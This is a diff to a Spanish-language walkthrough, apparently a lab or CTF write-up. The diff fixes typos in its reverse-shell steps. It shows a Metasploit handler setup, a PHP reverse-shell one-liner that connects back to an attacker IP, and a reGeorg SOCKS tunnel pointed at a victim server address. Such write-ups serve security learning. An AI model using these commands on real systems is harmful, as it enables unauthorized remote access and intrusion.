@@ -27,7 +27,7 @@ Como hay un botón de subida de archivos, vamos a intentar subir una webshell ub
 Parece que está funcionando. Para conseguir una reverse shell vamos a utilizar metasploit
 
 ```bash
-mfsconsole -q
+msfconsole -q
 use exploit/multi/handler
 set payload php/reverse_php
 set LHOST IP
@@ -37,7 +37,7 @@ exploit
 En la web shell vamos a ejecutar el comando.
 
 ```
-php -r '$sock=fspckopen("ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 Con esto se nos debería activar una sesión en meterpreter y ya tendremos la reverse shell.
@@ -59,6 +59,7 @@ La idea ahora es subir el tunnel al servidor víctima, para ello podemos utiliza
 Una vez subido, creamos una nueva tab y ejecutamos.
 
 ```bash
+cd Desktop/tools/reGeorg
 python reGeorgSocksProxy.py -p 9050 -u http://182.143.107.3/public/tunnel.php
 ```
 
